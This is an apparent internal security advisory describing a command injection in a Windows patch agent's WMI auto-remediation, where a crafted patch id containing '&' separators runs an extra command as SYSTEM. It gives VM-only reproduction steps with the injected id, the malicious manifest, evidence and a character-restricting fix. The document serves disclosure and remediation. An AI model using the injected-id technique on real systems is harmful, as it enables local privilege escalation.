# Patch runtime: command injection leading to SYSTEM code execution

## Summary

- Component: `patch-runtime` auto-remediation
- File: `packages/patch-runtime/src/windows.rs`
- Function: `arm_auto_remediate`
- Type: command injection (CWE-78) in a command that is executed as
  `LocalSystem` by a WMI `CommandLineEventConsumer`
- Impact: a patch manifest with a crafted `id` runs an arbitrary command as
  SYSTEM
- Severity: high (local privilege escalation; remote if the patches directory
  is reachable over a network share)

## Root cause

`arm_auto_remediate` builds a shell command and stores it in the WMI consumer's
`CommandLineTemplate`:

```rust
let command = format!(
    "cmd.exe /c \"\"{exe}\" patches remediate {patch_id} --patches-dir \"{}\" --json >> \"{log}\" 2>&1\"",
    patches_dir.display()
);
```

`patch_id` is interpolated **unquoted** into a `cmd.exe` command line. The only
sanitisation is `ps_quote`, which escapes single quotes for the surrounding
PowerShell string; it does not escape `cmd.exe` metacharacters.

`PatchManifest::validate` previously checked only that the id was non-empty.
Because a Windows directory name may contain `&`, spaces and `.`, an id such as

```text
poc-rce & fsutil file createnew poc-rce-marker.txt 0 & rem
```

is a valid directory name, passes validation, and is interpolated into the
command. The consumer then executes:

```text
cmd.exe /c ""C:\ll10\agent\ll10-agent.exe" patches remediate poc-rce &
fsutil file createnew poc-rce-marker.txt 0 & rem --patches-dir ..."
```

`cmd.exe` treats each `&` as a command separator, so `fsutil` runs as SYSTEM.

## Reproduction (VM only)

Prerequisites: the disposable `ll10-22h2` VM from the baseline snapshot, the
agent deployed under `C:\ll10\agent`, and a writable patches directory
(`C:\ll10\patches`, which grants `Authenticated Users: Modify`).

1. Create a patch directory whose name is the malicious id:

   ```text
   C:\ll10\patches\poc-rce & fsutil file createnew poc-rce-marker.txt 0 & rem
   ```

2. Put this `patch.yml` inside it (a benign registry operation plus
   auto-remediation on a watched file):

   ```yaml
   schema: 1
   id: poc-rce & fsutil file createnew poc-rce-marker.txt 0 & rem
   title: PoC command injection via auto-remediation
   severity: high
   cve: [CVE-2026-POC]
   target: guest
   requires: { admin: true, reboot: false }
   docs: { readme: README.md }
   applies_to:
     os: windows
     arch: [x86_64]
     builds: ">=19045.0 <19046.0"
   operations:
     - type: set_registry
       id: marker
       hive: HKLM
       key: SOFTWARE\LongLive10PoC
       name: Marker
       reg_type: dword
       data: 1
   checks:
     - type: registry_value
       id: check-marker
       hive: HKLM
       key: SOFTWARE\LongLive10PoC
       name: Marker
       reg_type: dword
       data: 1
   auto_remediate:
     enabled: true
     trigger: wmi_file_change
     scheduled_task_fallback: false
     debounce_seconds: 5
     respect_updates: true
     watch_paths: [C:\ll10\watch-poc.txt]
   revert: { after_journal: [] }
   ```

3. Apply it (as an administrator):

   ```powershell
   & C:\ll10\agent\ll10-agent.exe patches apply `
       'poc-rce & fsutil file createnew poc-rce-marker.txt 0 & rem' `
       --patches-dir C:\ll10\patches --confirm --json
   ```

   The engine reports `"state": "applied"` and registers the WMI subscription.

4. Trigger the watched file:

   ```powershell
   Add-Content C:\ll10\watch-poc.txt x
   ```

5. Within the debounce interval the SYSTEM consumer runs the injected
   command. `poc-rce-marker.txt` appears in the consumer's working directory
   (`C:\Windows\System32` in the validated run).

## Evidence (validated on `ll10-22h2`)

Registered consumer (observed in `root\subscription`):

```text
Name: LL10Remediate_poc-rce & fsutil file createnew poc-rce-marker.txt 0 & rem_consumer
CommandLineTemplate:
cmd.exe /c ""C:\ll10\agent\ll10-agent.exe" patches remediate poc-rce &
fsutil file createnew poc-rce-marker.txt 0 & rem --patches-dir
"C:\ll10\patches" --json >> "C:\ProgramData\LongLive10\remediate.log" 2>&1"
```

Marker created by the SYSTEM consumer:

```text
C:\Windows\System32\poc-rce-marker.txt   Length 0
```

The VM was reverted to the `baseline` snapshot afterwards.

## Fix

`PatchManifest::validate` now restricts the id to a conservative character set:

```rust
if !self.id.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')) {
    anyhow::bail!("invalid id ...");
}
```

This blocks `&`, `;`, `|`, `<`, `>` and spaces in the id, which is the value that
reached the unquoted `cmd.exe` argument. It also enforces the existing
"id equals directory name" invariant.

Regression test: `packages/patch-core/tests/manifest_id.rs`
(`rejects_shell_metacharacters_in_the_id`).

## Remaining hardening

- `patches_dir` is still interpolated into the same command. Windows paths
  cannot contain `"`, but callers should pass a trusted directory and the code
  should reject paths that are not canonical absolute paths.
- The patches directory should not be writable by non-administrators. The VM's
  `C:\ll10\patches` currently grants `Authenticated Users: Modify`; lock it to
  Administrators/SYSTEM.
- Prefer a non-shell consumer (`ExecutablePath` + `CommandLineTemplate` with
  properly quoted arguments) and drop the `cmd.exe /c` redirection.

## References

- `packages/patch-runtime/src/windows.rs` (`arm_auto_remediate`)
- `packages/patch-core/src/manifest.rs` (`PatchManifest::validate`)
- `packages/patch-core/tests/manifest_id.rs`
